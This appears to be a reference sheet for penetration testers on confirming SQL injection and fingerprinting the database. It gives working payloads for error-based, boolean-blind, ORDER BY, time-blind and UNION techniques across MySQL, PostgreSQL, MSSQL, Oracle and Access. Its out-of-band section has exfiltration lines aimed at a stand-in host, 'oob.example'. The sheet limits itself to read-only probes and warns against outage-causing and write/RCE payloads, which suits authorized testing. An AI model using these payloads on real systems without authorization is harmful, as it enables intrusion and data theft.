# Detection oracles + DBMS fingerprint

Five oracles, ordered by how cheaply they prove the class. Take the first that
gives a **repeatable differential**; a single anomaly is a lead, not a confirm.
Every payload here is a READ — no writes, short delays.

## Contents
- 1. Error-based (cheapest, and a free fingerprint)
- 2. Boolean-blind (no error shown, but the response changes)
- 3. `ORDER BY` / `sort` context (the frequently-missed one)
- 4. Time-blind (last resort — nothing reflects, no boolean diff)
- 5. UNION (when output is reflected — fastest extraction)
- 6. OOB (fully blind + stacked/functions allowed) — confirm reach only
- DBMS fingerprint quick table (once confirmed)

## 1. Error-based (cheapest, and a free fingerprint)

Inject one syntax-breaking char and read the response body: `'`, `"`, backtick,
`)`, `\`, `;`. A DB error string confirms *and* fingerprints in one request:

| Error fragment | DBMS |
|---|---|
| `You have an error in your SQL syntax`, `check the manual that corresponds to your MySQL` | MySQL/MariaDB |
| `ORA-01756: quoted string not properly terminated`, `ORA-00933` | Oracle |
| `unterminated quoted string`, `SQLSTATE[42601]`, `syntax error at or near` | PostgreSQL |
| `SQLSTATE[HY093]` (invalid parameter number) | PDO / PHP (any driver — see Drupal chain) |
| `Unclosed quotation mark after the character string`, `Incorrect syntax near` | MSSQL |
| `SQLite error`, `unrecognized token`, `near "…": syntax error` | SQLite |
| `Microsoft JET Database Engine`, `Syntax error in string in query expression` | Microsoft Access |

**Microsoft Access has no error string worth reading, so fingerprint it by table
existence instead**: `' OR EXISTS(SELECT * FROM MSysObjects) OR '1'='2` behaves as TRUE
while `MSysAccessObjects` (which does not exist) behaves as FALSE. `MSysObjects` /
`MSysQueries` are Access system tables and nothing else has them. Beware the automated
tools here — one corpus case had Ghauri report MySQL on an Access backend, and the
dialect decides every payload you write next.

**Balance test** (proves it's the quote, not a coincidence): the odd payload
errors, the balanced one does not.
- string ctx: `'` -> 500, `''` -> normal, `' -- -` -> normal.
- numeric ctx: `1'` -> 500, `1` -> normal.

Do NOT accept a generic 500 as an error-based confirm — it must be a *DB* error
string. A framework 500 with no SQL fragment is not this oracle.

**In GraphQL the injectable position is an argument, and there are four kinds.**
Query arguments are the obvious one; *field* arguments on nested fields, *directive*
arguments, and the operation name are the three that go untested. Argument names
that reach a query builder: `filter`, `where`, `search`, `keyword`, `orderBy`,
`sort`, `groupBy`, `having`. Driving sqlmap through a GraphQL body needs two
specific answers — see `../../graphql/references/injection-forgery.md` §SQLi.

## 2. Boolean-blind (no error shown, but the response changes)

Response body/length/status differs for a true vs false predicate, repeatably.

- string ctx: `x' AND '1'='1` (true) vs `x' AND '1'='2` (false).
- numeric ctx: `id=5 AND 1=1` vs `id=5 AND 1=2`; or the arithmetic form
  `id=5-0` (=5, true page) vs `id=5-1` (=4, different page) — survives many quote
  filters because there is no quote.
- Confirm it's the DB, not caching: run true/false/true and check the page
  *tracks the predicate* each time.

## 3. `ORDER BY` / `sort` context (the frequently-missed one)

`sort`/`order`/`orderBy`/`groupBy` usually can't be bound, so they land in the
query as raw text after `ORDER BY`. You can't UNION here, but you get an oracle:

- Column-index probe: `?sort=1` vs `?sort=99999` (out-of-range column -> error).
- Subquery boolean oracle (no quotes needed):
  `?sort=(CASE WHEN (1=1) THEN name ELSE age END)` vs `... (1=2) ...` -> row
  order flips between the two orderings = true/false oracle.
- MySQL error-extract via ORDER BY: `?sort=(SELECT 1 FROM (SELECT COUNT(*),
  CONCAT((SELECT version()),FLOOR(RAND(0)*2)) x FROM information_schema.tables
  GROUP BY x) y)` -> duplicate-entry error leaks the value.

## 4. Time-blind (last resort — nothing reflects, no boolean diff)

Only when 1–3 give nothing. Make it **repeatable and short**: prove the delay
tracks the argument (0s / 5s / 10s), don't trust one slow response.

| DBMS | Payload (string ctx; strip quotes for numeric) |
|---|---|
| MySQL/MariaDB | `' OR SLEEP(5)-- -` · conditional: `' OR IF(1=1,SLEEP(5),0)-- -` |
| PostgreSQL | `'||pg_sleep(5)--` · conditional: `';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--` (read CASE, no write) |
| MSSQL | `'; WAITFOR DELAY '0:0:5'--` · conditional: `';IF(1=1) WAITFOR DELAY '0:0:5'--` |
| Oracle | `' || dbms_pipe.receive_message(('a'),5)--` · or `' AND 1=(SELECT COUNT(*) FROM all_users WHERE ...)` heavy-query fallback |

Confirmation protocol: send `SLEEP(0)` (fast) -> `SLEEP(5)` (≈5s) -> `SLEEP(5)`
again (≈5s). Three consistent timings = confirmed. Keep it to a handful of
requests.

**`OR SLEEP()` is a service-degradation payload — do not fire it blind.** With `OR`, the
predicate is evaluated **once per scanned row**, so a five-second sleep against a table of
120k rows is not a five-second request, it is an outage you caused. Use the `AND` form
anchored on a value that matches a single row, or the conditional `IF(<P>,SLEEP(5),0)`
inside an `AND`. Better: if any error text reaches you, **skip time-blind entirely** and
use error-based extraction (`blind-extraction.md`) — it is one request per value, holds no
connection open, and cannot degrade the service. Time-blind is genuinely the last resort,
and on a large table it is a rung-5 action wearing a rung-2 costume.

## 5. UNION (when output is reflected — fastest extraction)

Two steps: find the column count, then place output.
- Column count: `' ORDER BY 1-- -`, `2`, `3`… until it errors (last good N =
  count). Or `' UNION SELECT NULL-- -`, `NULL,NULL`… until no type error.
- Find a printable column: `' UNION SELECT 1,2,3-- -` -> which number appears on
  the page is your output slot. Non-string slots may need `NULL`.
- Reflect the version to confirm end-to-end (read-only):
  MySQL `' UNION SELECT NULL,@@version,NULL-- -` ·
  Postgres `' UNION SELECT NULL,version(),NULL--` ·
  Oracle `' UNION SELECT NULL,banner,NULL FROM v$version--` (needs `FROM dual`
  padding when no table) · MSSQL `' UNION SELECT NULL,@@version,NULL--`.

## 6. OOB (fully blind + stacked/functions allowed) — confirm reach only

When there is no in-band channel at all, an out-of-band DNS/HTTP hit to **your
own** listener (Burp Collaborator / interactsh) confirms and can carry data. This
is a *read/exfil* channel — never the write variants.

- MSSQL: `'; EXEC master..xp_dirtree '\\<sub>.oob.example\a'--` (SMB/DNS lookup).
- Oracle: `SELECT UTL_HTTP.REQUEST('http://<sub>.oob.example/'||(SELECT user FROM dual)) FROM dual` · or `UTL_INADDR.get_host_address`.
- MySQL (Windows, `secure_file_priv` off): `... UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT ...),'.oob.example\\a'))`.
- PostgreSQL: `COPY (SELECT '') TO PROGRAM ...` is a **WRITE/RCE** primitive —
  **do not fire it**; use `dblink`/`UTL`-style read functions only if present.

Point OOB at your own collaborator host only. Data smuggled in the subdomain
label is a read; keep it to the one value that proves impact.

## DBMS fingerprint quick table (once confirmed)

| Trait | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| version | `@@version` | `version()` | `@@version` | `banner FROM v$version` | `sqlite_version()` |
| string concat | `CONCAT(a,b)` | `a||b` | `a+b` | `a||b` | `a||b` |
| comment | `-- ` / `#` / `/**/` | `--` / `/**/` | `--` / `/**/` | `--` | `--` |
| substring | `SUBSTRING(s,i,1)` | `SUBSTRING(s FROM i FOR 1)` | `SUBSTRING(s,i,1)` | `SUBSTR(s,i,1)` | `SUBSTR(s,i,1)` |
| current user | `current_user()` | `current_user` | `SYSTEM_USER` | `USER` | — |
| no-FROM select | ok | ok | ok | needs `FROM dual` | ok |

The dialect dictates the extraction gadget (`blind-extraction.md`) and gates the
CMS bugs (Drupal CVE-2026-9082 is **PostgreSQL only** — MySQL/SQLite are not
vulnerable). Fingerprint before you invest in a gadget.
